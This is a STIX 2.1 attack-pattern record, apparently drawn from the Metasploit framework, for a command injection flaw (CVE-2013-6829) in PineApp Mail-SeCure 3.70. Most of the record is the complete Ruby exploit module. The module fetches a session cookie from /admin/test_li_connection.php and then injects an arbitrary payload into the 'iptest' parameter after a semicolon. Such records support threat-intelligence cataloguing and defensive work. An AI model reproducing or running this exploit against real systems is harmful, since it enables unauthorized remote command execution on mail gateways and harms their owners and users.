{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--eb4a0a12-1286-4b1f-950d-1184a6810132",
    "created": "2024-08-14T17:02:00.98749Z",
    "modified": "2024-08-14T17:02:00.987494Z",
    "name": "PineApp Mail-SeCure test_li_connection.php Arbitrary Command Execution",
    "description": " This module exploits a command injection vulnerability on PineApp Mail-SeCure 3.70. The vulnerability exists on the test_li_connection.php component, due to the insecure usage of the system() php function. This module has been tested successfully on PineApp Mail-SeCure 3.70. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/pineapp_test_li_conn_exec.rb",
            "external_id": "pineapp_test_li_conn_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-6829"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'PineApp Mail-SeCure test_li_connection.php Arbitrary Command Execution',\n      'Description'    => %q{\n          This module exploits a command injection vulnerability on PineApp Mail-SeCure\n        3.70. The vulnerability exists on the test_li_connection.php component, due to the\n        insecure usage of the system() php function. This module has been tested successfully\n        on PineApp Mail-SeCure 3.70.\n      },\n      'Author'         =>\n        [\n          'Dave Weinstein', # Vulnerability discovery\n          'juan vazquez'    # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2013-6829' ],\n          [ 'ZDI', '13-188' ],\n          [ 'OSVDB', '95782' ]\n        ],\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'       => 1024,\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl python telnet'\n            }\n        },\n      'Targets'        =>\n        [\n          [ 'PineApp Mail-SeCure 3.70', { }]\n        ],\n      'DefaultOptions' =>\n        {\n          'SSL' => true\n        },\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2013-07-26'\n      ))\n\n    register_options(\n      [\n        Opt::RPORT(7443)\n      ],\n      self.class\n    )\n\n  end\n\n  def my_uri\n    return normalize_uri(\"/admin/test_li_connection.php\")\n  end\n\n  def get_cookies\n    res = send_request_cgi({\n      'uri' => my_uri,\n      'vars_get' => {\n        'actiontest' =>'1', # must be 1 in order to start the session\n        'idtest' => rand_text_alpha(5 + rand(3)),\n        'iptest' => \"127.0.0.1\" # In order to make things as fast as possible\n      }\n    })\n    if res and res.code == 200 and res.get_cookies.include?('SESSIONID')\n      return res.get_cookies\n    else\n      return nil\n    end\n  end\n\n  def check\n    # Since atm of writing this exploit there isn't patch available,\n    # checking for the vulnerable component should be a reliable test.\n    cookies = get_cookies\n    if cookies.nil?\n      return Exploit::CheckCode::Safe\n    end\n    return Exploit::CheckCode::Appears\n  end\n\n  def exploit\n    print_status(\"#{rhost}:#{rport} - Retrieving session cookie...\")\n    cookies = get_cookies\n    if cookies.nil?\n      fail_with(Failure::Unknown, \"Failed to retrieve the session cookie\")\n    end\n\n    print_status(\"#{rhost}:#{rport} - Executing payload...\")\n    send_request_cgi({\n      'uri' => my_uri,\n      'cookie' => cookies,\n      'vars_get' => {\n        'actiontest' =>'1', # must be 1 in order to trigger the vulnerability\n        'idtest' => rand_text_alpha(5 + rand(3)),\n        'iptest' => \"127.0.0.1;#{payload.encoded}\"\n      }\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-07-26",
    "x_mitre_platforms": [
        "['unix']"
    ]
}